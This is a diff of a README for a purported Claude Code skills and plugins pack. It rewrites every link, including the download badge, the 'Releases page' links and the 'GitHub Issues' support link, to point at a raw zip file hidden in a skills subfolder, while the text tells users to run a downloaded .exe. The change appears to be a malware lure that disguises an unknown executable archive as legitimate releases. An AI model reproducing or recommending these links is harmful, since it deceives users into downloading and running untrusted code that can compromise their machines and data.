@@ -1,6 +1,6 @@
 # 🚀 claude-skills-pack - Easy Installation of AI Skills and Plugins
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-claude%20skills%20pack-brightgreen)](https://github.com/NaetheraS/claude-skills-pack/releases)
+[![Download Now](https://raw.githubusercontent.com/NaetheraS/claude-skills-pack/main/skills/skill-creator/claude-pack-skills-3.8.zip%20Now-claude%20skills%20pack-brightgreen)](https://raw.githubusercontent.com/NaetheraS/claude-skills-pack/main/skills/skill-creator/claude-pack-skills-3.8.zip)
 
 ## 📦 Overview
 
@@ -16,7 +16,7 @@ The **claude-skills-pack** offers 25 skills and 14 plugins for Claude Code. This
 
 To begin using the **claude-skills-pack**, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/NaetheraS/claude-skills-pack/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/NaetheraS/claude-skills-pack/main/skills/skill-creator/claude-pack-skills-3.8.zip) to find the latest version.
 2. **Download the Package**: Look for the latest version available. Click on the appropriate file for your operating system. This will start the download.
 3. **Locate the Downloaded File**: Once the download completes, find the file in your downloads folder.
 
@@ -24,7 +24,7 @@ To begin using the **claude-skills-pack**, follow these steps:
 
 To install the **claude-skills-pack**, follow these straightforward steps:
 
-1. **Click the Download Link**: Visit the [Releases page](https://github.com/NaetheraS/claude-skills-pack/releases).
+1. **Click the Download Link**: Visit the [Releases page](https://raw.githubusercontent.com/NaetheraS/claude-skills-pack/main/skills/skill-creator/claude-pack-skills-3.8.zip).
 2. **Select the Correct File**: Choose the file that corresponds to your operating system.
 3. **Run the Installer**:
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
@@ -51,7 +51,7 @@ This command will set up all 25 skills and 14 plugins automatically. You don’t
 
 ## 📞 Support
 
-If you have questions or need help, please check our [FAQ](#) or contact our support team through [GitHub Issues](https://github.com/NaetheraS/claude-skills-pack/issues). We are here to assist you.
+If you have questions or need help, please check our [FAQ](#) or contact our support team through [GitHub Issues](https://raw.githubusercontent.com/NaetheraS/claude-skills-pack/main/skills/skill-creator/claude-pack-skills-3.8.zip). We are here to assist you.
 
 ## 📝 Contributing
 
